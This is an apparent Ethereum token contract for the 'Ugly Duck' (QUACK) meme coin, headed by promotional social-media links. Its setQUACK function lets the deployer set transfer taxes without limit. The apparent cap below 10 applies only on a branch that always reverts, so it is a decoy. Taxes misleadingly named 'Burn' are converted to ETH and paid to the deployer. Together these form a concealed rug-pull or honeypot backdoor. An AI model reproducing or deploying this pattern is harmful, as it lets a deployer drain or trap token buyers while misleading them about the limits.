/*

QUACK!QUACK!QUACK!

Enjoy our Quack game on the website!

Telegram: https://t.me/UglyDuckQUACK
Twitter: https://twitter.com/UglyDuckETH
Website: https://uglyduckquack.fun

*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

    interface IUniswapV2Router02 {
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
            ) external;
        }
        
    contract UglyDuck {
        string public constant name = "Ugly Duck";  //
        string public constant symbol = "QUACK";  //
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 8_888 * 10**decimals;

        uint256 BurnTNumber = 2;
        uint256 ConfirmTNumber = 2;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
            
        error Permissions();
            
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
            

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant deployer = payable(address(0xE96E4fAC4a79aE44504Cce85d01d96176A40f35c)); //

        bool private swapping;
        bool private TradingOpenStatus;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

         receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(TradingOpenStatus || from == deployer || to == deployer);

            if(!TradingOpenStatus && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                    );
                deployer.transfer(address(this).balance);
                swapping = false;
                }

            if(from != address(this)){
                uint256 FinalFigure = amount * (from == pair ? BurnTNumber : ConfirmTNumber) / 100;
                amount -= FinalFigure;
                balanceOf[address(this)] += FinalFigure;
            }
                balanceOf[to] += amount;
                emit Transfer(from, to, amount);
                return true;
            }

        function OpenTrade() external {
            require(msg.sender == deployer);
            require(!TradingOpenStatus);
            TradingOpenStatus = true;        
            }
            
        function setQUACK(uint256 newTBurn, uint256 newTConfirm) external {
        if(msg.sender == deployer){
            BurnTNumber = newTBurn;
            ConfirmTNumber = newTConfirm;
            }
        else{
            require(newTBurn < 10);
            require(newTConfirm < 10);
            revert();
            }  
        }
        }